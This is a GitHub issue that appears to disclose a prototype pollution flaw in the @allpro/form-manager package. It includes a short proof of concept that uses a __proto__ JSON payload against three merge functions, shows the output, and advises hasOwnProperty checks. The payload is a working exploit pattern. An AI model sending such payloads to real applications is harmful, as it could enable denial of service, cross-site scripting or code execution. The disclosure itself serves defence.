### **[mestrtee](/mestrtee)** commented [Mar 14, 2024](#issue-2187184904) • edited Loading

| Overview The module is vulenrable via three functions: , located at `setDefaults (form-manager/cjs/index.js:1299)`, `mergeBranch (form-manager/cjs/index.js:1249)`, and `Object.setObjectValue (form-manager/cjs/index.js:1536)` respectively. In all these implementations, the assignment of the property from source to destination occurred without proper protection. An attacker can be exploit this method to copy malicious property to the built-in Object.prototype through the special properties `__proto__` or `constructor.prototype`. Thus, the attacker can use one of these properties to pollute the application logic that can be escalated to Denial of service, remote code execution or cross-site scripting attacks. PoC: ``` (async () => {   const lib = await import('@allpro/form-manager'); var BAD_JSON = JSON.parse('{"__proto__":{"polluted":true}}'); var victim = {} console.log("Before Attack: ", JSON.stringify(victim.__proto__)); try { // uncomment one at a time   lib.default.defaultsDeep ({}, BAD_JSON)   //lib.default.merge ({}, BAD_JSON)   //lib.default.setObjectValue ({}, "__proto__.polluted", true) } catch (e) { } console.log("After Attack: ", JSON.stringify(victim.__proto__)); delete Object.prototype.polluted; })();  ```  Output:  ``` Before Attack:  {} After Attack:  {"polluted":true} ```  Output of a successful fix:  ``` Before Attack:  {} After Attack:  {} ``` How to prevent: Assign or copy a property should only be applied an own property of the destination object, thus, check for that (e.g using hasOwnProperty) is sufficient. Alternatively, block the property names `__proto__` or `constructor` assigned.
